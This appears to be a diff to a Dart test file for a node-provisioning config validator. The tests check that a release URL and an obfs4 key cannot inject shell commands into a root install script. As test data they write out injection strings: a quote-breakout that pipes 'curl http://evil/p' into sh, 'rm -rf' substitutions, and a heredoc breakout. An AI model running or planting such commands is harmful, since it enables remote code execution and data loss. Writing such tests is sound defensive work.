@@ -29,16 +29,52 @@ void main() {
     // an unverified root binary (PROVISION-RCE).
     expect(
         const NodeProvisionConfig(
-                releaseUrl: 'https://x', expectedSha256: '', obfs4PskB64: 'a')
+                releaseUrl: 'https://x',
+                expectedSha256: '',
+                obfs4PskB64:
+                    'CWz2E4fUutnZTr2KLjv62z1AUMWDORl1odamTdDdGAI=')
             .isValid,
         isFalse);
     expect(
         const NodeProvisionConfig(
                 releaseUrl: 'https://x',
                 expectedSha256: 'not-a-sha',
-                obfs4PskB64: 'a')
+                obfs4PskB64:
+                    'CWz2E4fUutnZTr2KLjv62z1AUMWDORl1odamTdDdGAI=')
             .isValid,
         isFalse);
+  });
+
+  test('rejects a release URL that could inject shell (PROVISION-RCE)', () {
+    NodeProvisionConfig u(String url) => NodeProvisionConfig(
+        releaseUrl: url,
+        expectedSha256: sha,
+        obfs4PskB64: 'CWz2E4fUutnZTr2KLjv62z1AUMWDORl1odamTdDdGAI=');
+    // The URL is interpolated into a root-sudo curl line; a quote-breakout or
+    // any shell metacharacter must be refused even though it "starts with https".
+    expect(u("https://x'; curl http://evil/p | sh #").isValid, isFalse);
+    expect(u(r'https://x/$(rm -rf ~)').isValid, isFalse);
+    expect(u('https://x/`id`').isValid, isFalse);
+    expect(u('https://a b/c').isValid, isFalse); // space
+    expect(u('https://x/a&b').isValid, isFalse); // & metachar
+    expect(u('http://example.com/veil-cli').isValid, isFalse); // not https
+    // A normal release-asset URL passes.
+    expect(
+        u('https://github.com/org/repo/releases/download/v1.2.3/veil-cli-x86_64-unknown-linux-musl')
+            .isValid,
+        isTrue);
+  });
+
+  test('rejects an obfs4 PSK that is not clean base64 (heredoc safety)', () {
+    NodeProvisionConfig p(String psk) => NodeProvisionConfig(
+        releaseUrl: 'https://example.com/veil-cli',
+        expectedSha256: sha,
+        obfs4PskB64: psk);
+    // A value with a newline / the heredoc delimiter could break out of the
+    // `<<'PSK_EOF'` block — valid base64 (no underscore, no newline) cannot.
+    expect(p('not base64! with spaces').isValid, isFalse);
+    expect(p('line1\nPSK_EOF\nrm -rf /').isValid, isFalse);
+    expect(p('CWz2E4fUutnZTr2KLjv62z1AUMWDORl1odamTdDdGAI=').isValid, isTrue);
   });
 
   test('script verifies the checksum BEFORE installing/running as root', () {
